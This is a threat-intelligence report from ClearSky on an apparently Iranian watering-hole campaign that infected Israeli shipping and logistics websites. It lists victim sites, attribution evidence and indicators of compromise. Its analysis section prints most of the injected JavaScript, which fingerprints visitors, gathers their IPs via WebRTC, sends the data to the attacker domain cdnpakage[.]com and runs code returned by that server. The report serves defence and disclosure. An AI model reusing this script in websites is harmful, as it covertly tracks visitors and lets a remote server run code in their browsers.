    "plain_text": "# Fata Morgana: Watering hole attack on shipping and logistics\n\n\n# websites \n\n\nIntroduction\n\nClearSky Cyber Security has detected a watering hole attack on at least eight Israeli websites. The\nattack is highly likely to be orchestrated by a nation-state actor from Iran, with a low confidence\nspecific attribution to Tortoiseshell (also called TA456 or Imperial Kitten).\n\nThe Infected sites collect preliminary user information through a script. We have discovered several\ndetails that suggest this script is used for malicious purposes.\n\nIn watering hole attacks, the attacker compromises a website that is frequently visited by a specific\ngroup of people, such as government officials, journalists, or corporate executives. Once compromised,\nthe attacker can inject malicious code to the website which will be executed when users visit it.\nCurrently, the campaign focuses on shipping and logistics companies, aligning with Iran’s focus on the\nsector for the past three years.\n\nWe conclude that the script is malicious based on the following points:\n\n   - C2 Attribution -The domain jquery-stack[.]online is attributed to TA456 (Tortoiseshell).\n   - Known iranian TTP - Watering hole attacks have been part of the initial access stage used by\nIranian threat actors since 2017. [1] This initial access technique was also mentioned by\nMandiant [2] in August 2022, where an Iranian threat actor named UNC3890 was targeting\nshipping companies in Israel using the same watering hole attack. In the current attack, visiting\nuser data is collected and sent to the attacker’s C2 server.\n   - Usage of “jQuery” - Our team observed four domains impersonating jQuery, a legitimate\nJavaScript framework, by using \"jQuery\" in their domain names. This is done to deceive\nanyone who checks the website code. We have already seen domain names impersonating\njQuery in a previous Iranian campaign from 2017 using a watering hole attack. The following\ndomain names were used: jguery[.]net, jguery[.]online. In the recent attack there was a use of\nsimilar domain names for example: jguery[.]org.\n   - Usage  of open source tools - The reuse of open-source penetration test tools that focus on\nweb browsers. In 2017, we reported the Iranian attacker used BeFF (the Browser Exploitation\nFramework Project), whereas in this case, the attacker used code taken partly from Metasploit\nframework [3,] with a few added unique strings. According to one of the victims, the JavaScript\nfound in this research is unknown to them, indicating that the script is malicious.\n\nPrevious Toroiseshell attacks have been observed using both custom and off-the-shelf malware to\ntarget IT providers in Saudi Arabia in what appeared to be supply chain attacks with the end goal of\ncompromising the IT providers' customers. The threat actor has been active since at least July 2018.[4]\n\n1 clearskysec.com/copykitten-jpost/\n\n2 mandiant.com/resources/blog/suspected-iranian-actor-targeting-israeli-shipping\n\n3 clearskysec.com/copykitten-jpost/\n\n4 malpedia.caad.fkie.fraunhofer.de/actor/tortoiseshell\n\n© 2023 All rights reserved to ClearSky Security Ltd\n\n\n-----\n\nAll eight websites detected by ClearSky analysts were infected by the same method using a similar\nJavaScript.\nOne of the infected websites, szm.co[.]il had already been classified as infected by ClearSky back in\nMay 2022, and was attributed to an unknown Iranian attacker.\n\nList of websites suspected of being infected (based on scans on 18/04/23).

According to our research, this\nwatering hole was created by an Iranian threat actor.\n\nFurther research led to the exposure of several additional websites that were infected by a watering\nhole orchestrated by the same Iranian threat actor.\n\nThe malicious JavaScript used in the watering hole collects data from visiting users. The data collected\nincludes the user's OS language, IP address, screen resolution, as well as the URL from which the\nwebsite was visited.\n\n5 ic3.gov/Media/News/2022/221020.pdf\n\n6 zdnet.com/article/thousands-of-israeli-sites-defaced-with-code-seeking-permission-to-access-userswebcams/\n\n© 2023 All rights reserved to ClearSky Security Ltd\n\n|leared of this code:|Col2|Col3|Col4|Col5|\n|---|---|---|---|---|\n|Victim|IP|Hosting Company|Industry|Related Malicious Domain|\n|sagaselect-am[.]com|68[.]183.241.30|Digital Ocean|Financial Services|cdn-code-jquery[.]info|\n|aviram.co[.]il|88[.]218.117.143|uPress|Shipping|cdnpakage.com|\n|sny-cargo[.]com|185[.]201.148.103|uPress|Shipping|cdnpakage[.]com|\n|szm.co[.]il|185[.]201.148.67|uPress|Kitchens and restaurants Supply|jquery-stack[.]online (Related to Tortoiseshell)/ jquery-code- download[.]online|\n|tel-bar.co[.]il|88[.]218.117.143|uPress|Medical|cdnpakage[.]com|\n|azma.co[.]il|88[.]218.117.143|uPress|Importing and marketing|cdnpakage[.]com|\n|depolog.co].[il|62[.]219.78.161|Bezeq International Ltd.|Shipping - Logistics|jquery-code- download[.]online|\n|Offe.co[.]il|62[.]219.58.182|Bezeq International Ltd.|Supply|jguery[.]org|\n\n\n-----\n\nThe collected data was trasferred as a JSON file by a POST request to a website controlled by the\nattacker. Below is an example of one of the scripts found containing the domain jquery-stack[.]online:\n\nSample of the JavaScript code\nThe malicious JavaScript contains a unique string of text which features grammatical errors. Based on\nthis unique string, our team was able to find another JavaScript that contains the same code but a\ndifferent domain.\n\nOur research found a JavaScript that shares the same code with different C2 domains on VirusTotal.\n\nFile name: addawdawdwdad\nFile type: Win32 EXE\nSha256: ef03bd18ca636be5ac23deb16a5a5821a647410c67b5ee33907f768f00f019bb\nSha1: c4244269f7c31c9a2bab7cabd568a1cda392ae74\nMd5: c3b47295bf32808551478963ac5e5195\n\nThe script is downloaded from the malicious website cdnpakage[.]com\nOur team discovered that cdnpakage[.]com previously had another SSL certificate related to another\ndomain - globalpneuservices[.]com.\n\nUsing the domain cdnpakage[.]com, additional infected domains were found: tel-bar.co[.]il,\naviram.co[.]il.\n\n© 2023 All rights reserved to ClearSky Security Ltd\n\n\n-----\n\nAnalysis of the Script\n\nThis script appears to be designed to collect information about the user's system and send it to a\nremote server.\nIt begins by declaring variables for an object and an array called ips.\nThe function getLang() checks if the navigator.languages property is defined, and if so, returns the\nfirst language in the array. If navigator.languages is not defined, it returns navigator.language.\nThe SendCall() function uses jQuery's $.ajax() method to make a POST request to a remote server at\nthe url \"https://cdnpakage.com/Info\".\nThe data sent with the request includes several pieces of information encoded using base64:\n\"object\": encoded current date as a string.\n\"rnamespace\": encoded pathname of the current page.\n\"Trigger\": encoded result of getLang() function call.\n\"Handler\": encoded screen resolution as a string.\n\"nonce\": encoded referrer.\n\"DOMParser\": always set to \"MQ==\", which is the base64 encoding of the string \"1\".\n\"restApi\": encoded list of plugin names.\n\"ECO\": encoded list of IP addresses obtained through a WebRTC STUN request.\n\"hashCanvas\": SHA-256 hash of an HTML canvas element that is generated within the script.\n\nThe hashCanvas variable is determined by generating an HTML canvas element and drawing some\nshapes to it. If an error occurs while creating the canvas, hashCanvas is set to the string \"noting !\".\nOtherwise, the SHA-256 hash of the canvas image data is computed and used as the value of\nhashCanvas.\n\nThe RealIPV() function attempts to obtain the user's IP address by creating a WebRTC peer\nconnection and gathering ICE candidates. Any candidates that match an IP address pattern are\nadded to the ips array.\n\nFinally, RealIPV() and SendCall() functions are called at the bottom of the script to gather information\nand send it to the remote server.\n\nThe site hXXps://cdnpakage[.]com/Info is indeed malicious, indicating that this script can be used as\npart of a watering hole attack.\n\nFurther analysis of the script\n\nThe provided script appears to be a part of a watering hole attack, attempting to compromise visitors\nof the infected website by collecting information about their system and then sending it to a remote\nserver controlled by the attacker.\n\nStarting with the variables, the \"obj\" variable is not used in the script yet. The \"ips\" variable is an\nempty array, which will later be populated with the user's IP addresses.\n\nvar obj;\nvar ips = [];\nvar hashCanvas;\n\nHere, three variables are declared: obj, ips, and hashCanvas. Their values are not set at this point.\n\n© 2023 All rights reserved to ClearSky Security Ltd\n\n\n-----\n\nThe code initializes an empty array called \"ips\" and then uses the window.location object to retrieve\nthe visitor’s IP address. It then checks if the IP address already exists in the \"ips\" array, and if it does\nnot, it adds the IP address to the array using the push() method.\n\nThe \"getLang()\" function attempts to determine the user's language preference by checking the\n\"navigator.languages\" array first, and if it's undefined, returning the \"navigator.language\" property.\nThis information could be useful to the attacker to customize their attack based on the user's\nlanguage.\n\nfunction getLang() {\nif (navigator.languages != undefined)\nreturn navigator.languages[0];\nreturn navigator.language;\n}\n\nThis function returns the user's preferred language for displaying content in their browser. It first\nchecks if the navigator.languages array is defined and returns the first language in the array. If it's not\ndefined, it returns to the navigator.language property.\n\nThe next function is:\n\nfunction SendCall(){\nvar x=navigator.plugins.length;\nvar pluggin = []\nfor(var i=0;i<x;i++)\n{\npluggin.push(navigator.plugins[i].name);\n}\n$.ajax({\ntype: \"POST\",\nurl: \"https://cdnpakage[.]com/Info\",\ndata: JSON.stringify({\n\"object\" : btoa(new Date().toLocaleString()),\n\"rnamespace\" : btoa(window.location.pathname),\n\"Trigger\" : btoa(getLang()),\n\"Handler\" : btoa(screen.width + \" x \" + screen.height),\n\"nonce\" : btoa(document.referrer),\n\"DOMParser\" : btoa(\"MQ==\"),\n\"restApi\": btoa(pluggin.toString()),\n\"ECO\" : btoa(ips.toString()),\n\"hashCanvas\" : hashCanvas.toString()\n}),\ncontentType: \"application/json\",\ndataType: \"json\",\nsuccess: function (response) {\nvar tagscript = document.createElement(\"script\");\ntagscript.innerHTML = response[\"code\"];\n\n© 2023 All rights reserved to ClearSky Security Ltd\n\n\n-----\n\ntagscript.setAttribute('type', 'text/javascript');\ndocument.head.appendChild(tagscript);\n},\n});\n}\n\nThe \"SendCall()\" function sends a POST request to a remote server at hXXps://cdnpakage[.]com/Info.\nIt collects various information about the user's system and encodes it in Base64 before sending it.\nThe collected information includes:\n\n  - \"object\": the current date and time, encoded in Base64.\n\n  - \"rnamespace\": the current URL path, encoded in Base64.\n\n  - \"Trigger\": the user's language preference, encoded in Base64.\n\n  - \"Handler\": the user's screen resolution, encoded in Base64.\n\n  - \"nonce\": the referrer URL, encoded in Base64.\n\n  - \"DOMParser\": an encoded string \"MQ==\", which is not clear what it represents.\n\n  - \"restApi\": a comma-separated list of the user's installed browser plugins,\nencoded in Base64.\n\n  - \"ECO\": a comma-separated list of the user's IP addresses, encoded in\nBase64.\n\n  - \"hashCanvas\": not clear yet\n\nAfter sending the POST request, if it's successful, the response will contain a \"code\" property, which is\nadded to a new \"script\" element in the \"head\" section of the document. This code is executed, which\ncould be a payload that attempts to exploit vulnerabilities in the user's system or steal their\ninformation.\n\nAfter this code response, the script creates a canvas element and draws some shapes and text on it\nusing various colors and composite operations. After that, it calculates a SHA-256 hash of the canvas\nelement's data URL using a custom implementation of the algorithm. If an error occurs during the\ncanvas creation or hash calculation, it sets the hash value to \"noting !\".\n\nThe JavaScript code creates a hidden iframe that loads a malicious website in the background, using\nthe same domain as the targeted website. This is done to hide the malicious activity from the victim.\n\nLater the code includes the next function:\n\nfunction RealIPV(){\nvar myPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection ||\nwindow.webkitRTCPeerConnection;\nvar pc = new myPeerConnection({iceServers: [{urls: \"stun:stun.l.google.com:19302\"}]}),\nnoop = function() {},\nlocalIPs = {},\nipRegex = /([0-9]{1,3}(\\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g,\nkey;\n\npc.createDataChannel(\"\");\n\n© 2023 All rights reserved to ClearSky Security Ltd\n\n\n-----\n\npc.createOffer(function(sdp) {\nsdp.sdp.split('\\n').forEach(function(line) {\nif (line.indexOf('candidate') < 0) return;\nline.match(ipRegex).forEach(ipIterate);\n});\npc.setLocalDescription(sdp, noop, noop);\n}, noop);\n\npc.onicecandidate = function(ice) {\nif (!ice || !ice.candidate || !ice.candidate.candidate || !ice.candidate.candidate.match(ipRegex))\nreturn;\nips.push((ice.candidate.candidate).toString())\n\n};\n}\nRealIPV();\nSendCall();\nThis code appears to be using the WebRTC API to gather information about the user's local IP address\nand send it to a function called \"SendCall()\".\n\nThe code first creates a new RTCPeerConnection object and sets the iceServers property to Google's\nSTUN server at Stun[.]l.google[.]com:19302. It then creates a data channel and an offer to exchange\nmedia over the connection.\n\nSTUN servers are used by both clients to determine their IP addresses as visible on the Internet. If\nboth peers are behind the same NAT, STUN settings are not needed since they are already reachable.\nSTUN effectively comes into play when the peers are on different networks.\n\nIn the offer callback function, the code extracts the local IP addresses from the SDP (Session\nDescription Protocol) of the offer by using a regular expression to match the IP address pattern.\nThese local IP addresses are stored in an object called \"localIPs\".\n\nThe onicecandidate event handler is then set to fire when an ICE candidate is discovered during the\nICE gathering process. When a candidate is found, it checks if it contains an IP address and if so, it is\nadded to an array called \"ips\".\n\nFinally, the function \"RealIPV()\" is called, which gathers the local and public IP addresses and stores\nthem in the \"localIPs\" and \"ips\" variables respectively. After that, the function \"SendCall()\" is called\nwhich presumably sends this information to some remote server or client.\n\nThis part of code appears to be attempting to obtain the real IP address of the user visiting the website.\nThe code achieves this by creating a WebRTC connection and extracting the IP address information\nfrom the connection. The extracted information is then passed on to the SendCall() function for further\nuse, which is a part of the watering hole attack as mentioned.\n\n© 2023 All rights reserved to ClearSky Security Ltd\n\n\n-----\n\nAttribution\n\nWe attribute the attack with high confidence to an Iranian threat actor based on the following findings:\n\n   - C2 Attribution - The domain jquery-stack[.]online is attributed to TA456 (Tortoiseshell).\n   - Our team observed four domains impersonating jQuery, a legitimate JavaScript framework,\nby using \"jQuery\" in their domain names. This is done to deceive anyone who checks the\nwebsite code. We have already seen domain names impersonating jQuery in a previous Iranian\ncampaign from 2017 using a watering hole attack. The following domain names were used:\njguery[.]net, jguery[.]online. In the recent attack there was a use of similar domain names for\nexample: jguery[.]org.\n   - Watering holes have been part of the initial access stage used by Iranian threat actors since at\nleast 2017.\n   - Iranian threat actors target Israeli websites and attempt to collect data on logistics companies\nassociated with shipping and healthcare.\n   - Re-use of open-source penetration testing tools that focus on web browsers was seen both in\nan Iranian campaign in 2017 and in this current campaign.\n   - Our team has contacted one of the victims, who confirmed that the JavaScript found in this\nresearch was not familiar to them, which emphasises the fact that the script is malicious.\n\nAs for the specific Iranian threat actor, we attribute the attack with “low confidence” to the Iranian\ngroup Tortoiseshell.\nAnyRun sandbox attributed (jquery-stack[.]online) to TA456 (Tortoiseshell).\n\nThe script itself was also stored on this domain: jquery-stack[.]online.\nThese findings add to the argument that the author of this script is Iranian.\n\nIndicators:\n\nHashes:\n\nef03bd18ca636be5ac23deb16a5a5821a647410c67b5ee33907f768f00f019bb\nc4244269f7c31c9a2bab7cabd568a1cda392ae74\nc3b47295bf32808551478963ac5e5195\n\nIP Addresses:\n170[.]130.55.55\n87[.]237.52.216\n45[.]150.65.27\n31[.]44.6.24\n91[.]242.217.138\n\nDomains:\ncdnpakage[.]com\njquery-stack[.]online\n\n© 2023 All rights reserved to ClearSky Security Ltd\n\n\n-----\n\nglobalpneuservices[.]com\njquery-code-download[.]online\ncdn-code-jquery[.]info\nJguery[.]org\n\nWe also detected three domains with a low confidence attribution to the attack.
